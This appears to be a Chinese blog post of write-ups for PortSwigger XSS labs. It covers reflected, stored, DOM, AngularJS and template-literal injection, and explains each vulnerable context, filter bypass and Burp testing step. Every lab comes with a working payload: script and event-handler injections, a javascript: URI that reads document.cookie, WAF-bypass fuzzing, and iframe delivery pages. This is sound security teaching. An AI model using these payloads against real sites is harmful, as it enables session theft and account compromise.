---
title: PortSwigger-Cross-site scripting
published: 2026-07-30T18:00:00
description: xss部分通关记录，非完整
tags:
  - 靶场
  - XSS
category: 网络安全
draft: false
---

# Lab: Reflected XSS into HTML context with nothing encoded

该漏洞源于服务端对搜索参数 `q` 的处理方式。当用户提交搜索请求时，服务端直接将 `q` 的值嵌入到响应 HTML 的 `<h2>` 标签内，未对 `<`、`>` 等特殊字符做任何 HTML 实体编码或过滤。攻击者可以在 `q` 参数中注入 `<script>alert(1)</script>`，由于浏览器解析响应时无法区分恶意脚本与合法内容，该脚本会在当前用户的浏览器上下文中立即执行。这种漏洞是反射式的，恶意负载不会保存在服务端，仅当用户点击攻击者构造的特定链接时才会触发，影响范围限于点击者本人。

- **注入点位置**：搜索功能的`q`参数，数据通过GET请求的查询字符串提交，服务端将其直接嵌入HTML的`<h2>`标签文本内容中。
    
- **利用方式**：无需任何绕过技巧。直接提交`<script>alert(1)</script>`即可触发弹窗。因为服务端"nothing encoded"——不对任何字符进行编码或过滤，原始的尖括号和脚本标签被完整保留在响应中。
    
- **与同类漏洞的区别**：这是最基础的XSS场景——HTML上下文且无任何编码/过滤。相比属性内XSS（需闭合引号）或JavaScript上下文XSS（需处理字符串引号），本场景的`<script>`标签可直接在任何HTML文本节点中执行，无需额外构造。
    
- **Burp测试方法**：在Burp Repeater中拦截`GET /?q=test`请求，将`q`参数值替换为`<script>alert(1)</script>`后发送。判断依据为响应中是否原样包含`<script>alert(1)</script>`以及浏览器是否弹出警告框。使用Burp的"Show response in browser"功能可直接在浏览器中验证执行效果。

```js
<script>alert(1)</script>
```

# Lab: Stored XSS into HTML context with nothing encoded

该漏洞本质是服务端未能对用户提交的评论内容进行安全处理。评论数据通过 POST 请求提交后，服务端直接将其存入数据库，而在后续渲染评论列表时，又从数据库取出并原样插入 HTML 页面，同样没有任何编码或过滤。攻击者提交包含 `<script>alert(1)</script>` 的评论后，所有访问该页面的用户都会在页面加载时执行该脚本。相比反射型，存储型 XSS 将恶意代码持久化，影响所有访客，且无需交互式点击即可触发，危害性更大，常被用于窃取会话凭证或进行大规模钓鱼。

- **注入点位置**：评论提交功能的`comment`参数（通常位于POST请求的`application/x-www-form-urlencoded`或`multipart/form-data`格式中），数据被持久化存储并在页面加载时动态渲染到HTML上下文中。
    
- **利用方式**：直接提交`<script>alert(1)</script>`即可，无需任何编码绕过或闭合技巧，因为服务端完全不处理尖括号和引号。提交后，无论何时刷新页面或新用户访问，弹窗都会自动触发，体现了存储型XSS的持久性危害。
    
- **与反射型XSS的区别**：反射型XSS仅影响点击恶意链接的特定用户，而存储型XSS影响所有访问受影响页面的用户，具有更广泛的攻击面和更大的危害性。此外，本实验中注入位置是文本节点（如评论内容），没有属性或JavaScript上下文的额外约束，因此最简单。
    
- **Burp测试方法**：使用Burp Repeater拦截评论提交的POST请求，修改`comment`参数为`<script>alert(1)</script>`并发送。随后访问包含该评论的页面（通常为`/post?postId=xxx`或博客详情页），观察响应中是否原样包含脚本标签，并确认浏览器弹出警告框。可通过Burp的“Render”或直接使用浏览器打开页面来验证。另外，可利用Burp Intruder进行模糊测试，但本场景最简单的注入即可成功。

```js
<script>alert(1)</script>
```

# Lab: DOM XSS in `document.write` sink using source `location.search`

前端JavaScript通过`location.search`获取URL参数并直接拼接到`document.write()`中，写入HTML的`<img>`标签的`src`属性。由于未对用户输入进行过滤，攻击者可注入`"`闭合原有属性，再插入`><script>`标签形成新的HTML元素，浏览器解析后执行恶意脚本。

- **注入点**：`location.search`中的`q`参数（或类似），被`document.write`写入`<img src="...">`内。
    
- **利用方式**：使用`"><script>alert(1)</script>`闭合双引号并终止`<img>`标签，然后创建新的`<script>`标签。无需编码绕过，只需控制引号和尖括号。
    
- **与服务器端XSS区别**：纯客户端漏洞，服务端不参与渲染，所有注入在浏览器端通过DOM操作完成。
    
- **Burp方法**：修改GET请求的`q`参数为payload，观察返回的HTML中是否出现`<script>`标签，并在浏览器中验证弹窗。

```js
"><script>alert(1)</script>
```

# Lab: DOM XSS in `innerHTML` sink using source `location.search`

该漏洞属于基于DOM的跨站脚本（DOM XSS），触发点在前端JavaScript代码中。页面脚本通过`location.search`获取URL查询参数（例如`search`字段），并将其直接赋值给某个元素的`innerHTML`属性。`innerHTML`会解析传入的HTML字符串并生成对应的DOM节点，但不会执行`<script>`标签内的代码（HTML5规范限制），然而它允许执行事件处理器（如`onerror`、`onload`等）中的JavaScript。攻击者传入`<img src=1 onerror=alert(1)>`后，浏览器创建`<img>`元素，由于`src=1`加载失败，触发`onerror`事件，从而执行`alert(1)`。该过程完全在客户端进行，服务端不参与响应内容的渲染，因此传统的服务端过滤（如HTML编码）无法防御，需在客户端对输入进行严格过滤或使用`textContent`等安全API。

- **注入点**：`location.search`中的`search`参数（通常为`/?search=xxx`），数据来源于URL查询字符串，被前端JS直接使用。
    
- **利用方式**：使用`<img src=1 onerror=alert(1)>`，无需闭合引号或绕过，因为输入直接作为HTML内容被解析，事件处理器可执行任意JS。
    
- **与服务器端XSS区别**：纯客户端漏洞，服务端仅返回静态或动态生成的HTML框架，但恶意负载的渲染和触发完全由浏览器端脚本控制，不经过服务端编码。
    
- **Burp测试方法**：拦截GET请求，修改`search`参数为payload，发送后查看响应中的JavaScript代码，确认`innerHTML`赋值语句中包含用户输入。随后在浏览器中直接访问该URL，验证是否弹出警告框（可使用Burp的“Repeater”配合“Show response in browser”功能）。

```js
<img src=1 onerror=alert(1)>
```

# Lab: DOM XSS in jQuery anchor `href` attribute sink using `location.search` source

该漏洞属于基于DOM的XSS，触发点在前端JavaScript代码中。页面使用jQuery从`location.search`获取`returnPath`参数的值，并直接将其赋值给某个`<a>`标签的`href`属性（通过类似`$("a").attr("href", returnPath)`的方式）。由于未对输入进行任何过滤或编码，攻击者可注入`javascript:`伪协议。当用户点击该链接时，浏览器会执行伪协议中的JavaScript代码，从而在用户上下文中触发任意脚本。

- **注入点**：URL查询参数`returnPath`，数据源为`location.search`。
    
- **利用方式**：构造`?returnPath=javascript:alert(document.cookie)`，通过`javascript:`伪协议执行任意JS。无需闭合标签或引号，直接作为href值即可。
    
- **与常规XSS区别**：纯客户端漏洞，服务端不渲染该值，所有处理在浏览器端由jQuery完成。不同于反射型需服务端回显，也不同于存储型持久化。
    
- **判断方法**：点击注入后的链接（如“Submit feedback”按钮）若弹出对话框，则证明漏洞存在。Burp中可直接修改`returnPath`参数并观察页面中`<a>`的`href`属性值。

```js
xxx.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
```

```js
// back按钮的超链接变为
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```

# Lab: DOM XSS in jQuery selector sink using a hashchange event

该漏洞属于基于DOM的跨站脚本攻击（DOM XSS），根源在于前端JavaScript将`location.hash`（URL中`#`后面的部分）未经充分过滤便直接拼接到jQuery的`$()`选择器中。页面代码监听`hashchange`事件，当URL哈希值变化时触发回调函数，通过`$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')')`选取包含特定文本的标题元素并滚动到可视区域。

攻击者利用jQuery选择器引擎的特性——`$()`不仅能选取DOM元素，还能创建并解析HTML标签。当`location.hash`被注入`<img src=x onerror=print()>`时，该标签被jQuery解析并附加到DOM树中，`onerror`事件触发执行`print()`函数。整个攻击链路完全在浏览器端完成：从读取`location.hash`到修改DOM再到执行恶意代码，服务端未参与任何数据处理或输出编码。

- **注入点与数据源**：注入点位于URL的`location.hash`（`#`后的片段标识符），数据源为`window.location.hash`属性。Payload通过`#`后的内容传入，例如`#<img src=x onerror=print()>`。
    
- **利用方式与核心机制**：利用jQuery的`$()`选择器不仅能选取元素，还能解析HTML标签的特性[](https://blog.csdn.net/gyzyc6/article/details/153263741)。无需闭合引号或绕过编码，直接将HTML标签作为hash值传入即可触发`onerror`等事件处理器。`hashchange`事件确保页面加载后修改hash也能触发漏洞代码。
    
- **与同类漏洞的区别**：区别于将用户输入作为属性值（如`href`）或文本内容的XSS，此漏洞将输入直接传入jQuery选择器引擎。由于`$()`具备解析HTML的能力，注入的标签会被创建并可能附加到DOM中。该漏洞依赖jQuery库的特定行为，是客户端框架使用不当导致的典型DOM XSS。
    
- **Burp测试方法**：在浏览器地址栏直接访问`https://YOUR-LAB-ID.web-security-academy.net/#<img src=x onerror=print()>`，观察是否弹出打印对话框。使用Burp Suite时，可在Repeater中修改请求的hash片段，观察响应中DOM的变化。在exploit服务器中通过`<iframe>`的`onload`事件动态修改hash触发漏洞：

```js
<iframe src="https://0af0002f04345eaa84ca369a008b00d2.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
```

# Lab: Reflected XSS into attribute with angle brackets HTML-encoded

该漏洞属于反射型跨站脚本（Reflected XSS），但注入点位于HTML标签的属性值内（如`<input value="...">`或`<a href="...">`）。服务端对用户输入的`<`和`>`字符进行了HTML实体编码（转换为`&lt;`和`&gt;`），防止攻击者直接注入新的HTML标签。然而，**引号（`"`或`'`）未被编码**，攻击者可利用未过滤的双引号提前闭合当前属性，然后注入任意事件处理器（如`onmouseover`、`onfocus`等），将剩余内容作为新属性插入，从而在用户交互时触发JavaScript执行。由于攻击载荷需要用户与元素交互（例如鼠标悬停），该漏洞的利用条件略高，但仍可被构造为恶意链接诱骗受害者。

- **注入点**：位于GET参数的`q`或类似字段，该值被嵌入到HTML标签的属性值中（例如`<input type="text" value="用户输入">`）。
    
- **利用方式**：使用`"onmouseover="alert(1)`，其中第一个`"`闭合原有`value`属性，`onmouseover`创建新的事件属性，第二个`"`闭合新属性（未闭合的引号会被浏览器自动修复）。当用户鼠标悬停于该元素上时，弹窗触发。
    
- **与普通反射XSS区别**：尖括号被编码阻止了标签注入，但属性注入仍可行，属于“属性内XSS”场景，需注意引号处理和事件选择。
    
- **测试方法**：在Burp中修改参数值，观察响应中属性值是否被正确截断；通过浏览器手动触发事件（如悬停）验证执行。

```js
"onmouseover="alert(1)
```

# Lab: Stored XSS into anchor `href` attribute with double quotes HTML-encoded

该漏洞属于存储型跨站脚本（Stored XSS），注入点位于用户提交的网站地址字段（`website`）。服务端将该字段的值嵌入到HTML的`<a>`标签的`href`属性中，例如`<a href="用户输入">Website</a>`。服务端仅对双引号（`"`）进行了HTML实体编码（转换为`&quot;`），防止攻击者闭合属性注入新的事件处理器，但**未对`javascript:`伪协议进行任何过滤或限制**。攻击者提交`javascript:alert(1)`作为网站地址，该值被原样存入数据库。当其他用户访问页面时，浏览器解析`<a href="javascript:alert(1)">`，点击该链接即会执行`alert(1)`。由于数据持久化存储，所有访问该页面的用户均受影响。

- **注入点**：评论或个人信息中的`website`字段，通过POST请求提交，数据被持久化存储并在渲染时嵌入`<a>`标签的`href`属性。
    
- **利用方式**：直接提交`javascript:alert(1)`，无需闭合引号或绕过编码，因为`javascript:`协议本身不需要引号，且`href`属性接受该协议作为合法URL。
    
- **与普通存储型XSS区别**：此场景限制了标签注入（双引号被编码），但忽略了伪协议，属于“属性内XSS”的变种，利用`javascript:`协议执行脚本。
    
- **测试方法**：在Burp中拦截提交请求，修改`website`参数为`javascript:alert(1)`，提交后访问包含该链接的页面，点击链接验证弹窗；也可使用`onmouseover`等事件，但本场景伪协议最简单。

```js
javascript:alert(1)
```

# Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

该漏洞属于反射型跨站脚本（Reflected XSS），注入点位于搜索参数中。服务端将用户输入嵌入到页面响应的JavaScript字符串上下文中（例如 `<script>var searchTerm = '用户输入';</script>`），并对尖括号（`<`、`>`）进行了HTML实体编码以防止标签注入。然而，**单引号（`'`）未被编码或转义**，攻击者可利用未过滤的单引号提前闭合JavaScript字符串，并注入任意JavaScript代码。本实验中，用户输入被插入到类似 `0 search results for '' + 用户输入 + ''` 的字符串拼接中（或直接作为字符串字面量），利用 `'-alert('xss')-'` 可构造有效的JavaScript表达式：该payload使字符串变为 `''-alert('xss')-''`，JavaScript引擎在执行时会先计算 `alert('xss')` 弹出警告框，然后进行减法运算，最终触发XSS。

- **注入点**：搜索功能的 `search` 参数（GET请求），该值被直接拼接到 `<script>` 标签内的JavaScript字符串字面量中。
    
- **利用方式**：使用 `'-alert('xss')-'` 闭合原有单引号，通过减号运算符将 `alert('xss')` 作为表达式执行。无需额外闭合括号，因为减号运算符会自动转换类型并执行函数。
    
- **与普通反射XSS区别**：尖括号被编码阻止标签注入，但JavaScript字符串的引号未被处理，导致可在字符串上下文中注入代码；此类注入需要构造合法的JavaScript语法，payload通常涉及字符串拼接、计算表达式或使用 `alert(1)` 等简单函数调用。
    
- **测试方法**：在Burp Repeater中修改 `search` 参数为 `'-alert('xss')-'`，观察响应中的 `<script>` 部分是否包含该payload并触发弹窗；也可直接在浏览器地址栏测试。

```js
'-alert('xss')-'
```

# Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element

该漏洞属于基于DOM的跨站脚本（DOM XSS），触发点在前端JavaScript代码中。页面脚本通过`location.search`获取URL查询参数（例如`storeId`），并将其直接拼接到`document.write()`写入的HTML中，而写入位置位于`<select>`元素内部（例如`<select><option>...</option>`）。由于`document.write()`在页面加载时动态生成HTML内容，且未对用户输入进行任何过滤或编码，攻击者可利用`storeId`参数注入恶意字符串。通过`">`闭合当前属性（如`value`或`option`文本），再使用`</select>`提前终止`<select>`元素，随后注入新的HTML标签（如`<img>`），利用`onerror`事件执行JavaScript。本payload `">`闭合了可能存在的双引号属性，`</select>`结束select块，使`<img>`成为独立元素并触发`onerror`。

- **注入点**：`location.search`中的`storeId`参数（或其他查询参数），通过`document.write`直接写入HTML中的`<select>`元素内，数据源完全在客户端。
    
- **利用方式**：使用`">`闭合可能的属性引号（例如`<select name="storeId">`），并用`</select>`结束select标签，然后插入`<img src=1 onerror=alert('xss')>`，触发`onerror`事件执行任意JS。无需考虑服务端编码，因为整个注入在浏览器端完成。
    
- **与服务器端XSS区别**：纯客户端漏洞，服务端仅返回包含JavaScript逻辑的静态HTML，恶意负载的生成和渲染完全由浏览器端`document.write`控制，服务端不参与处理该参数。
    
- **测试方法**：在Burp中修改`storeId`参数为payload，观察响应中的JavaScript代码确认`document.write`语句中包含用户输入；也可直接在浏览器地址栏构造URL并验证弹窗。

```js
product?productId=12&storeId="></select><img%20src=1%20onerror=alert(%27xss%27)>
```

# Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

该漏洞属于基于DOM的跨站脚本，但利用了AngularJS的表达式解析机制。页面使用AngularJS框架，将URL参数（如`search`）的值直接插入到HTML模板的插值表达式`{{...}}`中，或通过`ng-model`等指令绑定。服务端对尖括号和双引号进行HTML编码，阻止了传统的标签或属性注入，但AngularJS在客户端解析`{{}}`时会执行其中的JavaScript表达式。攻击者通过构造AngularJS表达式，如`{{$on.constructor('alert("xss")')()}}`，利用AngularJS的`$on`服务或其构造函数来执行任意代码，绕过沙盒限制。由于整个攻击在客户端完成，服务端的HTML编码对此无效。

- **注入点**：URL查询参数（如`search`），该参数值被AngularJS模板引擎解析为表达式。
    
- **利用方式**：提交`{{$on.constructor('alert("xss")')()}}`，通过`$on`的构造函数获取`Function`并执行任意JS。先用`{{7*7}}`测试是否支持表达式解析。
    
- **与常规DOM XSS区别**：依赖前端框架（AngularJS）的表达式语法，而非直接注入HTML或JavaScript字符串。
    
- **测试方法**：在Burp中修改参数值，观察页面是否执行表达式；使用AngularJS沙盒绕过技巧（如`$on.constructor`）实现攻击。

```js
{{7*7}}
{{$on.constructor('alert('xss')')()}}
```

# Lab: Reflected DOM XSS

该漏洞属于反射型DOM XSS，服务端接收搜索参数后返回JSON格式数据（包含`searchTerm`字段），客户端JavaScript通过`eval('var searchResultsObj = ' + this.responseText)`直接解析响应并执行。由于服务端对用户输入中的双引号进行转义（`"` → `\"`），但未对反斜杠做同样处理，攻击者可利用`\"`构造逃逸：输入`\"-alert(1)}//`，服务端返回的JSON变为`{"searchTerm":"\\"-alert(1)}//"}`，其中`\\"`被JSON解析为`\`和未转义的`"`，提前终止字符串，使`-alert(1)}`成为独立语句被执行，后续内容被`//`注释。整个攻击在客户端`eval`时触发，实现任意JavaScript执行。

- **注入点**：搜索参数`search`，通过`window.location.search`传递，服务端在JSON响应的`searchTerm`字段中反射。
    
- **利用方式**：使用`\"-alert(1)}//`，利用反斜杠抵消服务端添加的转义反斜杠，使双引号恢复闭合功能，破坏JSON结构并注入代码。
    
- **与普通反射XSS区别**：传统反射XSS直接回显HTML，而此处服务端返回JSON，客户端`eval`导致执行，属于服务端与客户端共同参与的混合型漏洞。
    
- **测试方法**：在Burp中修改`search`参数为payload，观察响应中`searchTerm`值出现`\\"`，且`eval`后弹窗；通过浏览器地址栏直接访问也可验证。

```js
// 漏洞核心：eval 解析服务端返回的 JSON，且 searchTerm 可被注入
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        eval('var searchResultsObj = ' + this.responseText);  // 危险函数
        displaySearchResults(searchResultsObj);
    }
};
xhr.open("GET", path + window.location.search);  // 参数来自 URL
xhr.send();

function displaySearchResults(searchResultsObj) {
    var searchTerm = searchResultsObj.searchTerm;   // 可控输入
    // 这里虽然用了 innerText，但漏洞在 eval 阶段已执行
}
```

```js
// payload：
\"-alert(1)}//

// 结果：
{"results":[],"searchTerm":"\\"-alert(1)}//"}
```

# Lab: Stored DOM XSS

该漏洞属于存储型XSS，服务端将评论内容存入数据库，客户端通过XHR请求获取JSON数据，并使用`displayComments`函数渲染评论。代码中的`escapeHTML`函数用于过滤用户输入，但**仅替换第一个出现的`<`和第一个出现的`>`**（非全局替换），导致过滤不完整。攻击者可构造`<><img src="xxxx" onerror="alert('xss')">`，其中第一个`<`和`>`被转义为`&lt;&gt;`，但后续的`<img>`标签因未被转义而直接插入DOM，触发`onerror`事件执行任意JavaScript。该漏洞利用存储特性，影响所有访问页面的用户。

- **注入点**：评论提交的`comment`参数（POST请求），数据持久化后通过XHR获取并在前端渲染。
    
- **利用方式**：使用`<><img src="xxxx" onerror="alert('xss')">`，利用`escapeHTML`仅替换首个尖括号的缺陷，使后续`<img>`原样输出，借助`onerror`执行脚本。
    
- **与同类漏洞区别**：常规存储型XSS多因未编码导致，此例因过滤函数实现不严谨（非全局替换）造成绕过。
    
- **测试方法**：在Burp中拦截评论提交请求，修改`comment`参数为payload，提交后刷新页面验证弹窗；也可直接利用`innerHTML`或属性注入。

```js
// 1. 通过 XHR 获取 JSON 响应
xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        let comments = JSON.parse(this.responseText);
        displayComments(comments);
    }
};
xhr.open("GET", postCommentPath + window.location.search);

// 2. 不安全的过滤函数（仅替换第一个 < 和 >）
function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}
```

```js
<><img src="xxxx" onerror="alert('xss')">
```

# Lab: Reflected XSS into HTML context with most tags and attributes blocked

此次实验需要用到：https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

服务端对用户输入实施了基于黑名单的过滤，拦截了`<script>`等常见标签，但并未完全禁用所有HTML标签和事件处理器。攻击者可通过**枚举XSS Cheat Sheet**中的标签和事件，逐个探测哪些未被WAF拦截。本实验中，`<body>`标签和`onresize`事件均未被过滤，组合成`<body onresize=print()>`即可绕过防御。利用`<iframe>`的`onload`事件动态改变iframe宽度以触发`onresize`，最终执行`print()`。

- **探测方法**：使用Burp Intruder，以XSS Cheat Sheet中的标签字典和事件字典作为Payload。先探测标签（如`<body>`返回200），再探测事件（如`onresize`返回200），确定可用组合。
    
- **利用方式**：构造`<body onresize=print()>`，通过`<iframe onload=this.style.width='400px'>`触发resize事件，无需用户交互即可执行`print()`。
    
- **判断依据**：状态码200表示标签或事件未被拦截；403或"Tag is not allowed"表示被过滤。

```js
// 尖括号没被过滤
0 search results for '<11>'

// 但是出现script等就会被waf拦截
search <script>
"Tag is not allowed"
```

```js
// Cross-site scripting (XSS) cheat sheet->tags字典
GET /?search=<$11$> HTTP/2
// 状态码200
GET /?search=<body> HTTP/2

// Cross-site scripting (XSS) cheat sheet->events字典
GET /?search=<body $11$> HTTP/2
// 状态码200
GET /?search=<body onresize> HTTP/2
```

```js
<iframe src="https://0a03001b038cde6a80d5ade500ce00b0.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='400px'>
```

# Lab: Reflected XSS into HTML context with all tags blocked except custom ones

WAF 拦截了所有已知的标准 HTML 标签（如 `<script>`、`<body>`、`<img>` 等），但**允许使用自定义标签**。自定义标签本身不具备默认行为，但可以像标准标签一样绑定事件处理器（如 `onfocus`）。攻击者通过模糊测试发现自定义标签（如 `<xss>`）未被拦截，遂构造 payload：`<xss id=x onfocus=alert('xss') tabindex=1>`。`tabindex=1` 使该元素可被键盘 Tab 键聚焦，URL 末尾的 `#x` 则通过页面哈希跳转自动将焦点定位到该元素上，从而触发 `onfocus` 事件执行 JavaScript。整个攻击过程无需用户交互，页面加载即自动执行。

- **注入点**：搜索参数 `search`，通过 GET 请求提交，服务端将输入原样反射回 HTML 页面中。
    
- **利用方式**：利用自定义标签 + `onfocus` 事件 + `tabindex` 使元素可聚焦 + URL 哈希 `#id` 自动定位触发，组合实现自动执行。
    
- **与同类漏洞区别**：常规 XSS 依赖已知标签（如 `<script>`、`<img>`），本场景所有已知标签被拦截，需通过模糊测试发现未被过滤的**自定义标签**作为攻击载体。
    
- **测试方法**：使用 Burp Intruder 搭配 XSS Cheat Sheet 中的标签列表进行模糊测试，筛选出返回状态码 200 且未被拦截的标签；再测试可用的事件处理器，最终组合成有效 payload。

```js
<script>
location = 'https://0ae2003b036588b2800967f9009b003a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28%27xss%27%29%20tabindex=1%3E#x';
</script>
```

# Lab: Reflected XSS with some SVG markup allowed

WAF对常见的HTML标签（如`<script>`、`<body>`、`<img>`等）进行了严格拦截，但**允许部分SVG标签及其关联事件**。攻击者借助XSS Cheat Sheet进行模糊测试，发现`<svg>`标签及其子元素`<animatetransform>`未被拦截，且`onbegin`事件可用。利用`<svg><animatetransform onbegin=alert('xss')>`，当页面加载SVG动画时，`onbegin`事件会在动画开始时自动触发，执行`alert('xss')`，无需任何用户交互。

- **注入点**：搜索参数`search`，通过GET请求提交，服务端将输入反射回HTML页面。
    
- **利用方式**：利用允许的`<svg>`标签和`<animatetransform>`元素的`onbegin`事件，在SVG动画初始化时自动执行JavaScript。
    
- **与同类漏洞区别**：传统标签被拦截，但SVG标记未被完全限制，利用SVG动画事件（`onbegin`、`onload`等）作为攻击载体绕过防御。
    
- **测试方法**：使用Burp Intruder，以XSS Cheat Sheet中的标签列表为字典，筛选出未被拦截的标签（如`<svg>`）；再以事件列表为字典，筛选出可用事件（如`onbegin`），组合成最终payload。

```js
<svg><animatetransform onbegin=alert('xss')>
```

# Lab: Reflected XSS in canonical link tag

服务端将用户输入反射到`<link>`标签的`href`属性中，并对尖括号（`<>`）进行HTML实体编码，防止注入新标签。但单引号未被过滤，攻击者可闭合原有`href`属性的引号，注入`accesskey`和`onclick`两个新属性。`accesskey='x'`为不可见的`<link>`元素注册了键盘快捷键`X`；当用户按下组合键（如Windows的`ALT+SHIFT+X`）时，浏览器激活该元素并触发`onclick`事件，执行`alert(1)`。攻击者利用`accesskey`将不可交互元素变成可触发载体，实现XSS。

- **注入点**：URL查询参数，被反射到`<link rel="canonical" href="...">`的`href`属性值中。
    
- **利用方式**：使用`'accesskey='x'onclick='alert(1)`，第一个单引号闭合原有`href`属性，后续内容作为新属性注入。`accesskey`提供触发器，`onclick`提供攻击载荷。
    
- **与同类漏洞区别**：尖括号被编码阻止标签注入，但未过滤单引号；`<link>`在`<head>`中不可见且不可交互，必须借助`accesskey`才能触发事件。
    
- **测试方法**：访问构造的URL后，按下对应操作系统的快捷键组合触发弹窗。注意：本实验的预期解决方案仅在Chrome浏览器中有效。

- On Windows: `ALT+SHIFT+X`
- On MacOS: `CTRL+ALT+X`
- On Linux: `Alt+X`

```js
https://0aec00d40390e31b80bd359b00dd00ea.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
```

# Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

该漏洞属于反射型XSS，注入点位于JavaScript字符串字面量中（`var searchTerms = '用户输入';`）。服务端对单引号（`'`）和反斜杠（`\`）进行了转义（分别转换为`\'`和`\\`），以防止通过闭合引号注入JavaScript代码。然而，**HTML解析器优先于JavaScript解析器**，攻击者可以使用`</script>`标签提前终止当前`<script>`块，绕过JavaScript层面的转义。注入`</script><script>alert(1)</script>`后，浏览器解析HTML时遇到`</script>`即结束当前脚本，随后将`<script>alert(1)</script>`作为新的脚本块执行，从而实现任意代码执行。此漏洞利用HTML与JavaScript解析顺序的差异，服务端的转义仅针对JavaScript字符串，但未能防御标签闭合。

- **注入点**：搜索参数（如`search`），被嵌入到JavaScript字符串变量`searchTerms`中，随后通过`document.write`写入HTML。
    
- **利用方式**：提交`</script><script>alert(1)</script>`，直接闭合当前`<script>`标签并创建新脚本块，无需闭合引号或处理转义。
    
- **与同类漏洞区别**：常规JavaScript字符串注入需闭合引号，但此场景因尖括号未被编码，利用`</script>`终止脚本块，绕过引号转义。
    
- **测试方法**：在Burp中修改`search`参数为payload，观察响应中是否出现新`<script>`标签并弹窗；直接在浏览器地址栏测试。

```js
<script>
    var searchTerms = 'aaa';
    document.write('<img src="/resources/images/tracker.gifsearchTerms='+encodeURIComponent(searchTerms)+'">');   
</script>
// 闭合
<script>
    var searchTerms = '</script>
    aaa';document.write('"
	<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">
    ">'); "
```

```js
</script><script>alert(1)</script>
```

# Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

服务端将用户输入的搜索词嵌入到 JavaScript 字符串字面量中（`var searchTerms = '用户输入';`），并对**单引号（`'`）** 和**反斜杠（`\`）** 都进行了转义（分别转换为 `\'` 和 `\\`），同时将尖括号和双引号进行 HTML 实体编码，以防止标签注入和属性注入。然而，攻击者可以利用反斜杠转义本身来“抵消”服务端添加的转义反斜杠：输入 `\'` 后，服务端将其转义为 `\\'`，其中 `\\` 表示一个字面反斜杠，后面的单引号不再被转义，从而提前终止字符串。随后注入 `-alert(1)//`，利用 JavaScript 的减号运算符执行 `alert` 函数，并用 `//` 注释掉后续内容，最终实现任意代码执行。

- **注入点**：搜索参数 `search`，被嵌入到 `<script>` 内的字符串变量中，通过 `document.write` 动态写入 HTML。
    
- **利用方式**：使用 `\'-alert(1)//`，利用反斜杠消耗掉服务端添加的转义反斜杠，使单引号闭合字符串，`-alert(1)` 作为表达式执行，`//` 注释多余字符。
    
- **与同类漏洞区别**：常规 JavaScript 字符串注入只需闭合引号，但此场景同时转义单引号和反斜杠，需通过反斜杠的转义逻辑绕过；尖括号和双引号被编码阻止标签注入，只能聚焦于字符串上下文。
    
- **测试方法**：在 Burp 中修改 `search` 参数为 `\'-alert(1)//`（URL 编码为 `%5C%27-alert(1)%2F%2F`），观察响应中 JavaScript 代码是否被破坏并弹出警告框。

```js
// 只输入了\
# 0 search results for '\\'
<script>
	var searchTerms = '\';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>

// 输入\'aaa
# 0 search results for '\\'aaa'
<script>
	var searchTerms = '\\'aaa';
	document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

```js
\'-alert(1)//
```

# Lab: Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

该漏洞属于存储型XSS，注入点位于评论的`website`字段，该字段被嵌入到`<a>`标签的`href`和`onclick`事件中。服务端对尖括号（`<>`）和双引号（`"`）进行HTML实体编码，同时对单引号（`'`）和反斜杠（`\`）进行转义（添加反斜杠），以防止属性注入和字符串逃逸。然而，服务端**仅对直接输入的单引号字符进行转义，未处理HTML实体`&apos;`**。攻击者提交`http://foo?&apos;-alert(1)-&apos;`，存储后页面输出时，浏览器解析`&apos;`为单引号，该单引号未被转义，从而在`onclick`属性的JavaScript字符串中提前闭合引号，注入`-alert(1)-`作为独立表达式执行，并用`-''`保持语法完整，最终触发弹窗。该漏洞利用了服务端过滤与浏览器解析之间的差异，成功绕过防御。

- **注入点**：评论提交的`website`参数（POST请求），数据持久化存储并在`<a>`标签的`href`和`onclick`属性中反射。
    
- **利用方式**：提交`http://foo?&apos;-alert(1)-&apos;`，利用HTML实体`&apos;`绕过服务端对单引号的转义，浏览器解析后使其成为未转义的单引号，闭合`onclick`中的字符串，插入`-alert(1)-`执行代码。
    
- **与同类漏洞区别**：常规存储型XSS多因直接未编码，本场景服务端做了多层过滤，但忽略了HTML实体编码的还原，属于“过滤不完整”导致的绕过。
    
- **测试方法**：在Burp中拦截评论提交请求，修改`website`参数为payload，提交后访问页面并点击包含该链接的元素（或触发`onclick`），观察弹窗。

```js
<a id="author" href="http://foo?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">11</a>
```

```js
http://foo?&apos;-alert(1)-&apos;
```

# Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

该漏洞属于反射型DOM XSS，注入点位于搜索参数，被嵌入到JavaScript模板字面量（Template Literal）中（`` `0 search results for '${用户输入}'` ``）。服务端对尖括号（`<>`）、单双引号（`''""`）、反斜杠（`\`）和反引号（`` ` ``）进行了Unicode转义（如`<`变为`\u003c`），以防止闭合模板字面量或注入HTML标签。然而，**模板字面量中的`${}`插值语法未被转义**，攻击者可直接注入`${alert(1)}`，JavaScript引擎在执行模板字面量时会解析`${}`内的表达式并执行，从而实现任意代码执行。该漏洞利用了服务端过滤不完整（遗漏了`${}`关键字符）的缺陷。

